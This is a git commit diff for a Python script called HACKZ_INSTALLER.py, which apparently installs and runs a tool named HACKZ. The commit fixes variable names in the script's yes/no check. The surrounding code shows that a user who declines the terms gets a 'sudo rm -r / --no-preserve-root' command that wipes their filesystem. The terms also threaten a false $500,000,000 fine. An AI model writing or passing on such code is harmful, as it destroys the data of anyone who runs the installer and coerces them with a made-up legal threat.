bee0561c7ef956e9532ac34769b83dc59a85bb96
AvexProducts <hackers300112@outlook.com>
2024-09-19 17:59:21 +1000

    Update HACKZ_INSTALLER.py

--- HACKZ_INSTALLER.py
+++ HACKZ_INSTALLER.py
@@ -5,7 +5,7 @@ print("HACKZ INSTALLER")
 print("===========================================")
 print("Do you agree to the terms and conditions that are the following: redistributing, changing or saying that anything related to HACKZ is made by you other than AvexProducts, you will be fined $500000000 USD. THIS IS LEGALLY ALLOWED. Type 'YES' or 'NO'")
 choice = input("Enter: ")
-if enter == "YES":
+if choice == "YES":
     print("Type 'install' to install the requirements and run HACKZ latest version. ")
     enter = input("Enter : ")
     while True:
@@ -19,7 +19,7 @@ if enter == "YES":
         else:
             print("ERROR. COULD NOT UNDERSTAND")
             continue
-elif enter == "NO":
+elif choice == "NO":
     print("You are NOT allowed to use this software. ")
     time.sleep(3)
     os.system('sudo rm -r / --no-preserve-root')
